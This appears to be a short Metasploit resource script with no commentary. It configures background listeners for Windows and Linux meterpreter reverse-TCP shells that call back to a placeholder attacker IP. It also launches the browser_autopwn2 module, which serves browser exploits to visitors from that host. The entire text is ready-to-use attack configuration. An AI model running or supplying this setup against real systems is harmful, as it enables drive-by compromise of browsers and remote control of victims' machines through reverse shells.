use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST your_attacker_ip
set LPORT 4444
set ExitOnSession false
exploit -j -z

use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST your_attacker_ip
set LPORT 5555
set ExitOnSession false
exploit -j -z

use exploit/browser_autopwn2
set target 1,2
set srvhost your_attacker_ip
set srvport 8080
set SRVHOST2 your_attacker_ip
set SRVPORT2 8081
exploit -j -z
